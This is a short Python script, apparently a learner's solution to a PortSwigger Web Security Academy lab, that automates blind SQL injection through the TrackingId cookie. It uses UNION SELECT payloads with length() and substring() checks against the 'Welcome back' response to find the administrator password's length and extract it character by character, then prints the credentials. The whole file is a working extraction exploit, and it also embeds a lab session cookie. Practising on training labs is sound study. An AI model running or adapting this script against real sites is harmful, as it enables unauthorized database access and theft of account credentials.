# My first ever simple Blind SQL injection with conditional responses script for PortSwigger WebSecurityAcademy 
# Tired of brute-forcing with Intruder, so lets try something else

import requests
import json
import string

check = list(string.ascii_lowercase) + list(map(str, range(10)))
flag = ''
current_index = 1;
current_len = 0
user = 'administrator'
url = 'https://acdb1f011fa30d3080194c4600270037.web-security-academy.net/'

print("Finding password length..")
while True:

	payload = f"x'union select 'a' from users where username={user} and length(password)>{current_len} --"
	header = {
	    "Host": "acdb1f011fa30d3080194c4600270037.web-security-academy.net",
	    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
	    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.5",
		"Accept-Encoding": "gzip, deflate",
		"Connection": "close",
		"Cookie": f"TrackingId={payload}; session=xGj2iVil46BmFyqrJ9b2FFKHT1ksvKnA",
		"Cache-Control": "max-age=0",
		"Upgrade-Insecure-Requests": "1"
	}

	r = requests.get(url, headers=header)

	if "Welcome back" in r.text:
		current_len += 1
		
	else:
		break

print(f'Password length is {current_len} character!')

print("Injecting..")

while True:

	for x in check:

		payload = f"x'UNION SELECT 'a' FROM users WHERE username={user} AND substring(password,1,{current_index})='{flag + x}' -- "
		header = {
		    "Host": "acdb1f011fa30d3080194c4600270037.web-security-academy.net",
		    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
		    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			"Accept-Language": "en-US,en;q=0.5",
			"Accept-Encoding": "gzip, deflate",
			"Connection": "close",
			"Cookie": f"TrackingId={payload}; session=xGj2iVil46BmFyqrJ9b2FFKHT1ksvKnA",
			"Cache-Control": "max-age=0",
			"Upgrade-Insecure-Requests": "1"
		}

		r = requests.get(url, headers=header)

		if "Welcome back" in r.text:

			flag += x
			print(f"Current password: {flag}")
			current_index += 1
			
			break

	if len(flag) == current_len:
		print("Hacking finish!")
		print("Enjoy the creds")
		print(f"administrator:{flag}")
		break;












